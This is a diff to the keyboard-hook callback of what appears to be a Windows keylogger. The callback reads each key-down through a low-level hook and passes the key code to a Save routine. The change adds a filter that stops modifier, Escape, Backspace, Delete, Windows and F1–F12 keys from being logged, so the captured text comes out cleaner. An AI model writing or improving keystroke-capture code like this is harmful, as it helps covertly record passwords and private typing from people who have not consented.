@@ -66,18 +66,42 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode >= 0)
 	{
-		// the action is valid: HC_ACTION.
 		if (wParam == WM_KEYDOWN)
 		{
-			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 
-			// save to file
+			// Add condition to ignore specific keys
+			if (kbdStruct.vkCode == VK_ESCAPE ||
+				kbdStruct.vkCode == VK_BACK ||
+				kbdStruct.vkCode == VK_DELETE ||
+				kbdStruct.vkCode == VK_LSHIFT ||
+				kbdStruct.vkCode == VK_RSHIFT ||
+				kbdStruct.vkCode == VK_LCONTROL ||
+				kbdStruct.vkCode == VK_RCONTROL ||
+				kbdStruct.vkCode == VK_RMENU ||
+				kbdStruct.vkCode == VK_LMENU ||
+				kbdStruct.vkCode == VK_LWIN ||
+				kbdStruct.vkCode == VK_RWIN ||
+				kbdStruct.vkCode == VK_F1 ||
+				kbdStruct.vkCode == VK_F2 ||
+				kbdStruct.vkCode == VK_F3 ||
+				kbdStruct.vkCode == VK_F4 ||
+				kbdStruct.vkCode == VK_F5 ||
+				kbdStruct.vkCode == VK_F6 ||
+				kbdStruct.vkCode == VK_F7 ||
+				kbdStruct.vkCode == VK_F8 ||
+				kbdStruct.vkCode == VK_F9 ||
+				kbdStruct.vkCode == VK_F10 ||
+				kbdStruct.vkCode == VK_F11 ||
+				kbdStruct.vkCode == VK_F12)
+			{
+				return CallNextHookEx(_hook, nCode, wParam, lParam); // Skip logging these keys
+			}
+
 			Save(kbdStruct.vkCode);
 		}
 	}
 
-	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
 	return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
